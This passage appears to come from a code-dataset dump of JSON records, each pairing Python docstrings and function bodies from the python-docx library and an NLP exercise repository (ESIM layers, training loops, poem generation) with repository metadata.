         match.start())\n                                log.debug(\"matched in elements: %s\", e)\n                                if isinstance(replace, etree._Element):\n                                    log.debug(\"Will replace with XML CODE\")\n                                elif isinstance(replace(list, tuple)):\n                                    log.debug(\"Will replace with LIST OF\"\n                                              \" ELEMENTS\")\n                                else:\n                                    log.debug(\"Will replace with:\",\n                                              re.sub(search, replace,\n                                                     txtsearch))\n\n                            curlen = 0\n                            replaced = False\n                            for i in e:\n                                curlen += len(searchels[i].text)\n                                if curlen > match.start() and not replaced:\n                                    # The match occurred in THIS element.\n                                    # Puth in the whole replaced text\n                                    if isinstance(replace, etree._Element):\n                                        # Convert to a list and process\n                                        # it later\n                                        replace = [replace]\n                                    if isinstance(replace, (list, tuple)):\n                                        # I'm replacing with a list of\n                                        # etree elements\n                                        # clear the text in the tag and\n                                        # append the element after the\n                                        # parent paragraph\n                                        # (because t elements cannot have\n                                        # childs)\n                                        p = findTypeParent(\n                                            searchels[i],\n                                            '{%s}p' % nsprefixes['w'])\n                                        searchels[i].text = re.sub(\n                                            search, '', txtsearch)\n                                        insindex = p.getparent().index(p)+1\n                                        for r in replace:\n                                            p.getparent().insert(\n                                                insindex, r)\n                                            insindex += 1\n                                    else:\n                                        # Replacing with pure text\n                                        searchels[i].text = re.sub(\n                                            search, replace, txtsearch)\n                                    replaced = True\n                                    log.debug(\n                                        \"Replacing in element #: %s\", i)\n                                else:\n                                    # Clears the other text elements\n                                    searchels[i].text = ''\nreturn newdocument", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"\nReturn a new paragraph element containing *paratext*. The paragraph's\ndefault style is 'Body Text', but a new style may be set using the\n*style* parameter.\n\n@param string jc: Paragraph alignment, possible values:\n                  left, center, right, both (justified), ...\n                  see http://www.schemacentral.com/sc/ooxml/t-w_ST_Jc.html\n                  for a full list\n\nIf *paratext* is a list, add a run for each (text, char_format_str)\n2-tuple in the list. char_format_str is a string containing one or more\nof the characters 'b', 'i', or 'u', meaning bold, italic, and underline\nrespectively. For example:\n\n    paratext = [\n        ('some bold text', 'b'),\n        ('some normal text', ''),\n        ('some italic underlined text', 'iu')\n    ]\n\"\"\"\n# Make our elements\n", "func_signal": "def paragraph(paratext, style='BodyText', breakbefore=False, jc='left'):\n", "code": "paragraph = makeelement('p')\n\nif not isinstance(paratext, list):\n    paratext = [(paratext, '')]\ntext_tuples = []\nfor pt in paratext:\n    text, char_styles_str = (pt if isinstance(pt, (list, tuple))\n                             else (pt, ''))\n    text_elm = makeelement('t', tagtext=text)\n    if len(text.strip()) < len(text):\n        text_elm.set('{http://www.w3.org/XML/1998/namespace}space',\n                     'preserve')\n    text_tuples.append([text_elm, char_styles_str])\npPr = makeelement('pPr')\npStyle = makeelement('pStyle', attributes={'val': style})\npJc = makeelement('jc', attributes={'val': jc})\npPr.append(pStyle)\npPr.append(pJc)\n\n# Add the text to the run, and the run to the paragraph\nparagraph.append(pPr)\nfor text_elm, char_styles_str in text_tuples:\n    run = makeelement('r')\n    rPr = makeelement('rPr')\n    # Apply styles\n    if 'b' in char_styles_str:\n        b = makeelement('b')\n        rPr.append(b)\n    if 'i' in char_styles_str:\n        i = makeelement('i')\n        rPr.append(i)\n    if 'u' in char_styles_str:\n        u = makeelement('u', attributes={'val': 'single'})\n        rPr.append(u)\n    run.append(rPr)\n    # Insert lastRenderedPageBreak for assistive technologies like\n    # document narrators to know when a page break occurred.\n    if breakbefore:\n        lastRenderedPageBreak = makeelement('lastRenderedPageBreak')\n        run.append(lastRenderedPageBreak)\n    run.append(text_elm)\n    paragraph.append(run)\n# Return the combined paragraph\nreturn paragraph", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"Test that a new document can be created\"\"\"\n", "func_signal": "def testnewdocument():\n", "code": "document, docbody, relationships = simpledoc()\ncoreprops = coreproperties(\n    'Python docx testnewdocument',\n    'A short example of making docx from Python', 'Alan Brooks',\n    ['python', 'Office Open XML', 'Word']\n)\nsavedocx(\n    document, coreprops, appproperties(), contenttypes(), websettings(),\n    wordrelationships(relationships), TEST_FILE\n)", "path": "python-docx/tests/test_docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "'''Make a new heading, return the heading element'''\n", "func_signal": "def heading(headingtext, headinglevel, lang='en'):\n", "code": "lmap = {'en': 'Heading', 'it': 'Titolo'}\n# Make our elements\nparagraph = makeelement('p')\npr = makeelement('pPr')\npStyle = makeelement(\n    'pStyle', attributes={'val': lmap[lang]+str(headinglevel)})\nrun = makeelement('r')\ntext = makeelement('t', tagtext=headingtext)\n# Add the text the run, and the run to the paragraph\npr.append(pStyle)\nrun.append(text)\nparagraph.append(pr)\nparagraph.append(run)\n# Return the combined paragraph\nreturn paragraph", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"\nTest that a new document can be created\n\"\"\"\n", "func_signal": "def testnewdocument_noimagecopy():\n", "code": "document, docbody, relationships, imagefiledict = simpledoc(\n    noimagecopy=True\n)\ncoreprops = coreproperties(\n    'Python docx testnewdocument',\n    'A short example of making docx from Python', 'Alan Brooks',\n    ['python', 'Office Open XML', 'Word']\n)\nsavedocx(\n    document, coreprops, appproperties(), contenttypes(), websettings(),\n    wordrelationships(relationships), TEST_FILE,\n    imagefiledict=imagefiledict\n)", "path": "python-docx/tests/test_docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"Ensure an etree element is returned\"\"\"\n", "func_signal": "def testopendocx():\n", "code": "if isinstance(opendocx(TEST_FILE), lxml.etree._Element):\n    pass\nelse:\n    assert False", "path": "python-docx/tests/test_docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "'''Return the raw text of a document, as a list of paragraphs.'''\n", "func_signal": "def getdocumenttext(document):\n", "code": "paratextlist = []\n# Compile a list of all paragraph (p) elements\nparalist = []\nfor element in document.iter():\n    # Find p (paragraph) elements\n    if element.tag == '{'+nsprefixes['w']+'}p':\n        paralist.append(element)\n# Since a single sentence might be spread over multiple text elements,\n# iterate through each paragraph, appending all text (t) children to that\n# paragraphs text.\nfor para in paralist:\n    paratext = u''\n    # Loop through each paragraph\n    for element in para.iter():\n        # Find t (text) elements\n        if element.tag == '{'+nsprefixes['w']+'}t':\n            if element.text:\n                paratext = paratext+element.text\n        elif element.tag == '{'+nsprefixes['w']+'}tab':\n            paratext = paratext + '\\t'\n    # Add our completed paragraph text to the list of paragraph text\n    if not len(paratext) == 0:\n        paratextlist.append(paratext)\nreturn paratextlist", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"\nCreate app-specific properties. See docproperties() for more common\ndocument properties.\n\n\"\"\"\n", "func_signal": "def appproperties():\n", "code": "appprops = makeelement('Properties', nsprefix='ep')\nappprops = etree.fromstring(\n    '<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><Properties x'\n    'mlns=\"http://schemas.openxmlformats.org/officeDocument/2006/extended'\n    '-properties\" xmlns:vt=\"http://schemas.openxmlformats.org/officeDocum'\n    'ent/2006/docPropsVTypes\"></Properties>')\nprops =\\\n    {'Template':             'Normal.dotm',\n     'TotalTime':            '6',\n     'Pages':                '1',\n     'Words':                '83',\n     'Characters':           '475',\n     'Application':          'Microsoft Word 12.0.0',\n     'DocSecurity':          '0',\n     'Lines':                '12',\n     'Paragraphs':           '8',\n     'ScaleCrop':            'false',\n     'LinksUpToDate':        'false',\n     'CharactersWithSpaces': '583',\n     'SharedDoc':            'false',\n     'HyperlinksChanged':    'false',\n     'AppVersion':           '12.0000'}\nfor prop in props:\n    appprops.append(makeelement(prop, tagtext=props[prop], nsprefix=None))\nreturn appprops", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\" Perform misc cleaning operations on documents.\n    Returns cleaned document.\n\"\"\"\n\n", "func_signal": "def clean(document):\n", "code": "newdocument = document\n\n# Clean empty text and r tags\nfor t in ('t', 'r'):\n    rmlist = []\n    for element in newdocument.iter():\n        if element.tag == '{%s}%s' % (nsprefixes['w'], t):\n            if not element.text and not len(element):\n                rmlist.append(element)\n    for element in rmlist:\n        element.getparent().remove(element)\n\nreturn newdocument", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "'''Return set of all regex matches\n\nThis is an advanced version of python-docx.search() that takes into\naccount blocks of <bs> elements at a time.\n\nWhat it does:\nIt searches the entire document body for text blocks.\nSince the text to search could be spawned across multiple text blocks,\nwe need to adopt some sort of algorithm to handle this situation.\nThe smaller matching group of blocks (up to bs) is then adopted.\nIf the matching group has more than one block, blocks other than first\nare cleared and all the replacement text is put on first block.\n\nExamples:\noriginal text blocks : [ 'Hel', 'lo,', ' world!' ]\nsearch : 'Hello,'\noutput blocks : [ 'Hello,' ]\n\noriginal text blocks : [ 'Hel', 'lo', ' __', 'name', '__!' ]\nsearch : '(__[a-z]+__)'\noutput blocks : [ '__name__' ]\n\n@param instance  document: The original document\n@param str       search: The text to search for (regexp)\n                      append, or a list of etree elements\n@param int       bs: See above\n\n@return set      All occurences of search string\n\n'''\n\n# Compile the search regexp\n", "func_signal": "def AdvSearch(document, search, bs=3):\n", "code": "searchre = re.compile(search)\n\nmatches = []\n\n# Will match against searchels. Searchels is a list that contains last\n# n text elements found in the document. 1 < n < bs\nsearchels = []\n\nfor element in document.iter():\n    if element.tag == '{%s}t' % nsprefixes['w']:  # t (text) elements\n        if element.text:\n            # Add this element to searchels\n            searchels.append(element)\n            if len(searchels) > bs:\n                # Is searchels is too long, remove first elements\n                searchels.pop(0)\n\n            # Search all combinations, of searchels, starting from\n            # smaller up to bigger ones\n            # l = search lenght\n            # s = search start\n            # e = element IDs to merge\n            found = False\n            for l in range(1, len(searchels)+1):\n                if found:\n                    break\n                for s in range(len(searchels)):\n                    if found:\n                        break\n                    if s+l <= len(searchels):\n                        e = range(s, s+l)\n                        txtsearch = ''\n                        for k in e:\n                            txtsearch += searchels[k].text\n\n                        # Searcs for the text in the whole txtsearch\n                        match = searchre.search(txtsearch)\n                        if match:\n                            matches.append(match.group())\n                            found = True\nreturn set(matches)", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"\nCreate core properties (common document properties referred to in the\n'Dublin Core' specification). See appproperties() for other stuff.\n\"\"\"\n", "func_signal": "def coreproperties(title, subject, creator, keywords, lastmodifiedby=None):\n", "code": "coreprops = makeelement('coreProperties', nsprefix='cp')\ncoreprops.append(makeelement('title', tagtext=title, nsprefix='dc'))\ncoreprops.append(makeelement('subject', tagtext=subject, nsprefix='dc'))\ncoreprops.append(makeelement('creator', tagtext=creator, nsprefix='dc'))\ncoreprops.append(makeelement('keywords', tagtext=','.join(keywords),\n                 nsprefix='cp'))\nif not lastmodifiedby:\n    lastmodifiedby = creator\ncoreprops.append(makeelement('lastModifiedBy', tagtext=lastmodifiedby,\n                 nsprefix='cp'))\ncoreprops.append(makeelement('revision', tagtext='1', nsprefix='cp'))\ncoreprops.append(\n    makeelement('category', tagtext='Examples', nsprefix='cp'))\ncoreprops.append(\n    makeelement('description', tagtext='Examples', nsprefix='dc'))\ncurrenttime = time.strftime('%Y-%m-%dT%H:%M:%SZ')\n# Document creation and modify times\n# Prob here: we have an attribute who name uses one namespace, and that\n# attribute's value uses another namespace.\n# We're creating the element from a string as a workaround...\nfor doctime in ['created', 'modified']:\n    elm_str = (\n        '<dcterms:%s xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instanc'\n        'e\" xmlns:dcterms=\"http://purl.org/dc/terms/\" xsi:type=\"dcterms:'\n        'W3CDTF\">%s</dcterms:%s>'\n    ) % (doctime, currenttime, doctime)\n    coreprops.append(etree.fromstring(elm_str))\nreturn coreprops", "path": "python-docx/docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"Ensure text can be pulled out of a document\"\"\"\n", "func_signal": "def testtextextraction():\n", "code": "document = opendocx(TEST_FILE)\nparatextlist = getdocumenttext(document)\nassert len(paratextlist) > 0", "path": "python-docx/tests/test_docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"Ensure search and replace functions work\"\"\"\n", "func_signal": "def testsearchandreplace():\n", "code": "document, docbody, relationships = simpledoc()\ndocbody = document.xpath('/w:document/w:body', namespaces=nsprefixes)[0]\nassert search(docbody, 'ing 1')\nassert search(docbody, 'ing 2')\nassert search(docbody, 'graph 3')\nassert search(docbody, 'ist Item')\nassert search(docbody, 'A1')\nif search(docbody, 'Paragraph 2'):\n    docbody = replace(docbody, 'Paragraph 2', 'Whacko 55')\nassert search(docbody, 'Whacko 55')", "path": "python-docx/tests/test_docx.py", "commit_date": "2014-02-06 00:00:00", "repo_name": "mikemaccana/python-docx", "stars": 1066, "license": "mit", "language": "python", "size": 861}
{"docstring": "\"\"\"\u751f\u6210\u85cf\u5934\u8bd7\"\"\"\n", "func_signal": "def generate_head(self, head_sentence):\n", "code": "poetry = []\nhead_char_len = len(head_sentence)  # \u8981\u751f\u6210\u7684\u53e5\u5b50\u7684\u6570\u91cf\nsentence_len = 0  # \u5f53\u524d\u53e5\u5b50\u7684\u6570\u91cf\npre_char = '<START>'  # \u524d\u4e00\u4e2a\u5df2\u7ecf\u751f\u6210\u7684\u5b57\n\n# \u51c6\u5907\u7b2c\u4e00\u6b65\u8981\u8f93\u5165\u7684\u6570\u636e\ninput = (torch.Tensor([self.word_to_ix['<START>']]).view(1, 1).long()).to(self.device)\nhidden = self.model.init_hidden(self.config.layer_num, 1)\n\nfor i in range(self.max_len):\n    # \u524d\u5411\u8ba1\u7b97\u51fa\u6982\u7387\u6700\u5927\u7684\u5f53\u524d\u8bcd\n    output, hidden = self.model(input, hidden)\n    top_index = output.data[0].topk(1)[1][0].item()\n    char = self.ix_to_word[top_index]\n\n    # \u53e5\u9996\u7684\u5b57\u7528\u85cf\u5934\u5b57\u4ee3\u66ff\n    if pre_char in ['\u3002', '\uff01', '<START>']:\n        if sentence_len == head_char_len:\n            break\n        else:\n            char = head_sentence[sentence_len]\n            sentence_len += 1\n            input = (input.data.new([self.word_to_ix[char]])).view(1,1)\n    else:\n        input = (input.data.new([top_index])).view(1,1)\n\n    poetry.append(char)\n    pre_char = char\n\nreturn poetry", "path": "nlp-beginner-finish/task5/sample.py", "commit_date": "2020-04-10 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nTrain a model for one epoch on some input data with a given optimizer and\ncriterion.\nArgs:\n    model: A torch module that must be trained on some input data.\n    dataloader: A DataLoader object to iterate over the training data.\n    optimizer: A torch optimizer to use for training on the input model.\n    criterion: A loss criterion to use for training.\n    epoch_number: The number of the epoch for which training is performed.\n    max_gradient_norm: Max. norm for gradient norm clipping.\nReturns:\n    epoch_time: The total time necessary to train the epoch.\n    epoch_loss: The training loss computed for the epoch.\n    epoch_accuracy: The accuracy computed for the epoch.\n\"\"\"\n# Switch the model to train mode.\n# print('train')\n", "func_signal": "def train(model, dataloader, optimizer, criterion, epoch_number, max_gradient_norm):\n", "code": "model.train()\ndevice = model.device\nepoch_start = time.time()\nbatch_time_avg = 0.0\nrunning_loss = 0.0\ncorrect_preds = 0\ntqdm_batch_iterator = tqdm(dataloader)\n# print(tqdm_batch_iterator)\nfor batch_index, (q, q_len, h, h_len, label) in enumerate(tqdm_batch_iterator):\n    # print(q)\n    # print(h)\n    # print(batch_index)\n    # print((q, q_len, h, h_len, label))\n    batch_start = time.time()\n    # Move input and output data to the GPU if it is used.\n    q1 = q.to(device)\n    q1_lengths = q_len.to(device)\n    q2 = h.to(device)\n    q2_lengths = h_len.to(device)\n    labels = label.to(device)\n    optimizer.zero_grad()\n    logits, probs = model(q1, q1_lengths, q2, q2_lengths)\n    # print(logits)\n    loss = criterion(logits, labels)\n    loss.backward()\n    nn.utils.clip_grad_norm_(model.parameters(), max_gradient_norm)\n    optimizer.step()\n    batch_time_avg += time.time() - batch_start\n    running_loss += loss.item()\n    correct_preds += correct_predictions(probs, labels)\n    print(loss.item())\n    print(correct_preds)\n    description = \"Avg. batch proc. time: {:.4f}s, loss: {:.4f}\"\\\n                  .format(batch_time_avg/(batch_index+1), running_loss/(batch_index+1))\n    tqdm_batch_iterator.set_description(description)\nepoch_time = time.time() - epoch_start\nepoch_loss = running_loss / len(dataloader)\nepoch_accuracy = correct_preds / len(dataloader.dataset)\nreturn epoch_time, epoch_loss, epoch_accuracy", "path": "nlp-beginner-finish/task3/utils.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nArguments:\n    vector_size {int} -- word embedding size.\n    vocab_size {int} -- vocabulary size.\nKeyword Arguments:\n    dropout {float} -- dropout rate. (default: {0.5})\n\"\"\"\n", "func_signal": "def __init__(self, vector_size, vocab_size, dropout=0.5):\n", "code": "super(EmbeddingLayer, self).__init__()\n\nself.vector_size = vector_size\nself.embed = nn.Embedding(vocab_size, vector_size)\nself.dropout = VariationalDropout(dropout)", "path": "nlp-beginner-finish/task3/model.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nCompute the loss and accuracy of a model on some validation dataset.\nArgs:\n    model: A torch module for which the loss and accuracy must be\n        computed.\n    dataloader: A DataLoader object to iterate over the validation data.\n    criterion: A loss criterion to use for computing the loss.\n    epoch: The number of the epoch for which validation is performed.\n    device: The device on which the model is located.\nReturns:\n    epoch_time: The total time to compute the loss and accuracy on the\n        entire validation set.\n    epoch_loss: The loss computed on the entire validation set.\n    epoch_accuracy: The accuracy computed on the entire validation set.\n\"\"\"\n# Switch to evaluate mode.\n", "func_signal": "def validate(model, dataloader, criterion):\n", "code": "model.eval()\ndevice = model.device\nepoch_start = time.time()\nrunning_loss = 0.0\nrunning_accuracy = 0.0\nall_prob = []\nall_labels = []\n# Deactivate autograd for evaluation.\nwith torch.no_grad():\n    for (q, q_len, h, h_len, label) in dataloader:\n        # Move input and output data to the GPU if one is used.\n        q1 = q.to(device)\n        q1_lengths = q_len.to(device)\n        q2 = h.to(device)\n        q2_lengths = h_len.to(device)\n        labels = label.to(device)\n        logits, probs = model(q1, q1_lengths, q2, q2_lengths)\n        loss = criterion(logits, labels)\n        running_loss += loss.item()\n        running_accuracy += correct_predictions(probs, labels)\n        all_prob.extend(probs[:, 1].cpu().numpy())\n        all_labels.extend(label)\nepoch_time = time.time() - epoch_start\nepoch_loss = running_loss / len(dataloader)\nepoch_accuracy = running_accuracy / (len(dataloader.dataset))\nreturn epoch_time, epoch_loss, epoch_accuracy, roc_auc_score(all_labels, all_prob)", "path": "nlp-beginner-finish/task3/utils.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nArguments:\n    x {torch.Tensor} -- [batch, features]\nReturns:\n    logits {torch.Tensor} -- raw, unnormalized scores for each class. [batch, class_num]\n\"\"\"\n", "func_signal": "def forward(self, x):\n", "code": "logits = self.mlp(x)\nreturn logits", "path": "nlp-beginner-finish/task3/model.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "# \u8bfb\u53d6\u6570\u636e\u96c6\n", "func_signal": "def get_data():\n", "code": "print(\"Loading training and validation data...\")\nX_train, X_test, y_train, y_test = data_get.provide_data()\nX_train = X_train.toarray()\nX_test = X_test.toarray()\nreturn X_train, X_test, y_train, y_test, len(X_train[0])", "path": "nlp-beginner-finish/task1/main.py", "commit_date": "2020-04-09 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nArguments:\n    m {torch.Tensor} -- [batch, seq_len, input_size]\nReturns:\n    outputs {torch.Tensor} -- [batch, seq_len, hidden_size * 2]\n\"\"\"\n", "func_signal": "def forward(self, m):\n", "code": "y = self.dropout(self.F(m))\nself.lstm.flatten_parameters()\noutputs, _ = self.lstm(y)\n\nassert m.shape[:2] == outputs.shape[:2] and \\\n    outputs.shape[-1] == self.hidden_size * 2\nreturn outputs", "path": "nlp-beginner-finish/task3/model.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nArguments:\n    input_size {int} -- input size to the feedforward neural network.\n    output_size {int} -- output size of the feedforward neural network.\n    hidden_size {int} -- output hidden size of the LSTM model.\nKeyword Arguments:\n    dropout {float} -- dropout rate (default: {0.5})\n\"\"\"\n", "func_signal": "def __init__(self, input_size, output_size, hidden_size, dropout=0.5):\n", "code": "super(CompositionLayer, self).__init__()\nself.hidden_size = hidden_size\nself.F = nn.Linear(input_size, output_size)\nself.lstm = nn.LSTM(output_size, hidden_size,\n                    num_layers=1, bidirectional=True)\nself.dropout = VariationalDropout(dropout)", "path": "nlp-beginner-finish/task3/model.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nReplace the all the values of vectors in 'tensor' that are masked in\n'masked' by 'value'.\nArgs:\n    tensor: The tensor in which the masked vectors must have their values\n        replaced.\n    mask: A mask indicating the vectors which must have their values\n        replaced.\n    value: The value to place in the masked vectors of 'tensor'.\nReturns:\n    A new tensor of the same size as 'tensor' where the values of the\n    vectors masked in 'mask' were replaced by 'value'.\n\"\"\"\n", "func_signal": "def replace_masked(tensor, mask, value):\n", "code": "mask = mask.unsqueeze(1).transpose(2, 1)\nreverse_mask = 1.0 - mask\nvalues_to_add = value * reverse_mask\nreturn tensor * mask + values_to_add", "path": "nlp-beginner-finish/task3/utils.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\u6d4b\u8bd5\u96c6\u4e0a\u51c6\u786e\u7387\u8bc4\u4f30\"\"\"\n", "func_signal": "def evaluate(model, Loss, x_val, y_val):\n", "code": "batch_val = batch_iter(x_val, y_val, 64)\nacc = 0\nlos = 0\nfor x_batch, y_batch in batch_val:\n    size = len(x_batch)\n    x = np.array(x_batch)\n    y = np.array(y_batch)\n    x = torch.LongTensor(x)\n    y = torch.Tensor(y)\n    # y = torch.LongTensor(y)\n    # x = Variable(x)\n    # y = Variable(y)\n    out = model(x)\n    loss = Loss(out, y)\n    # optimizer.zero_grad()\n    # loss.backward()\n    # optimizer.step()\n    loss_value = np.mean(loss.detach().numpy())\n    accracy = np.mean((torch.argmax(out, 1) == torch.argmax(y, 1)).numpy())\n    acc +=accracy*size\n    los +=loss_value*size\nreturn los/len(x_val), acc/len(x_val)", "path": "nlp-beginner-finish/task2/torch_train.py", "commit_date": "2020-05-11 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"Apply local inference to premise and hyopthesis.\nArguments:\n    p {torch.Tensor} -- p has shape [batch, seq_len_p, 2 * hidden_size]\n    h {torch.Tensor} -- h has shape [batch, seq_len_h, 2 * hidden_size]\n    p_mask {torch.Tensor (int)} -- p has shape [batch, seq_len_p], 0 in the mask\n        means padding.\n    h_mask {torch.Tensor (int)} -- h has shape [batch, seq_len_h]\nReturns:\n    m_p, m_h {torch.Tensor} -- tensor with shape [batch, seq_len, 8 * hidden_size]\n\"\"\"\n# equation 11 in the paper:\n", "func_signal": "def forward(self, p, h, p_mask, h_mask):\n", "code": "e = torch.matmul(p, h.transpose(1, 2))  # [batch, seq_len_p, seq_len_h]\n\n# masking the scores for padding tokens\ninference_mask = torch.matmul(p_mask.unsqueeze(2).float(),\n                              h_mask.unsqueeze(1).float())\ne.masked_fill_(inference_mask < 1e-7, -1e7)\n\n# equation 12 & 13 in the paper:\nh_score, p_score = self.softmax_1(e), self.softmax_2(e)\nh_ = h_score.transpose(1, 2).bmm(p)\np_ = p_score.bmm(h)\n\n# equation 14 & 15 in the paper:\nm_p = torch.cat((p, p_, p - p_, p * p_), dim=-1)\nm_h = torch.cat((h, h_, h - h_, h * h_), dim=-1)\n\nassert inference_mask.shape == e.shape\nassert p.shape == p_.shape and h.shape == h_.shape\nassert m_p.shape[-1] == p.shape[-1] * 4\n\nreturn m_p, m_h", "path": "nlp-beginner-finish/task3/model.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nArguments:\n    input_size {int} -- input size to the feedforward neural network.\n    output_size {int} -- output size of the feedforward neural network.\n    hidden_size {int} -- output hidden size of the LSTM model.\nKeyword Arguments:\n    dropout {float} -- dropout rate (default: {0.5})\n\"\"\"\n", "func_signal": "def __init__(self, input_size, output_size, hidden_size, dropout=0.5):\n", "code": "super(InferenceComposition, self).__init__()\nself.composition = CompositionLayer(input_size,\n                                    output_size,\n                                    hidden_size,\n                                    dropout=dropout)\n# self.composition_h = deepcopy(self.composition_p)\nself.pooling = Pooling()", "path": "nlp-beginner-finish/task3/model.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nApply a masked softmax on the last dimension of a tensor.\nThe input tensor and mask should be of size (batch, *, sequence_length).\nArgs:\n    tensor: The tensor on which the softmax function must be applied along\n        the last dimension.\n    mask: A mask of the same size as the tensor with 0s in the positions of\n        the values that must be masked and 1s everywhere else.\nReturns:\n    A tensor of the same size as the inputs containing the result of the\n    softmax.\n\"\"\"\n", "func_signal": "def masked_softmax(tensor, mask):\n", "code": "tensor_shape = tensor.size()\nreshaped_tensor = tensor.view(-1, tensor_shape[-1])\n# Reshape the mask so it matches the size of the input tensor.\nwhile mask.dim() < tensor.dim():\n    mask = mask.unsqueeze(1)\nmask = mask.expand_as(tensor).contiguous().float()\nreshaped_mask = mask.view(-1, mask.size()[-1])\n\nresult = nn.functional.softmax(reshaped_tensor * reshaped_mask, dim=-1)\nresult = result * reshaped_mask\n# 1e-13 is added to avoid divisions by zero.\nresult = result / (result.sum(dim=-1, keepdim=True) + 1e-13)\nreturn result.view(*tensor_shape)", "path": "nlp-beginner-finish/task3/utils.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nCompute the number of predictions that match some target classes in the\noutput of a model.\nArgs:\n    output_probabilities: A tensor of probabilities for different output\n        classes.\n    targets: The indices of the actual target classes.\nReturns:\n    The number of correct predictions in 'output_probabilities'.\n\"\"\"\n", "func_signal": "def correct_predictions(output_probabilities, targets):\n", "code": "_, out_classes = output_probabilities.max(dim=1)\ncorrect = (out_classes == targets).sum()\nreturn correct.item()", "path": "nlp-beginner-finish/task3/utils.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nArguments:\n    x {torch.Tensor} -- input tensor with shape [batch_size, seq_length]\n\"\"\"\n", "func_signal": "def forward(self, x):\n", "code": "e = self.embed(x)\nreturn self.dropout(e)", "path": "nlp-beginner-finish/task3/model.py", "commit_date": "2020-04-08 00:00:00", "repo_name": "Alic-yuan/nlp-beginner-finish", "stars": 1241, "license": "None", "language": "python", "size": 128500}
{"docstring": "\"\"\"\nArgs:\n    premise_batch: A batch of sequences of vectors representing the\n        premises in some NLI task. The batch is assumed to have the\n        size (batch, sequences, vector_dim).\n    premise_mask: A mask for the sequences in the premise batch, to\n        ignore padding data in the sequences during the computation of\n        the attention.\n    hypothesis_batch: A batch of sequences of vectors representing the\n        hypotheses in some NLI task. The batch is assumed to have the\n        size (batch, sequences, vector_dim).\n    hypothesis_mask: A mask for the sequences in the hypotheses batch,\n        to ignore padding data in the sequences during the computation\n        of the attention.\nReturns:\n    attended_premises: The sequences of attention vectors for the\n        premises in the input batch.\n    attended_hypotheses: The sequences of attention vectors for the\n        hypotheses in the input batch.\n\"\"\"\n# Dot product between premises and hypotheses in each sequence of\n# the batch.\n", "func_signal": "def forward(self, premise_batch, premise_mask, 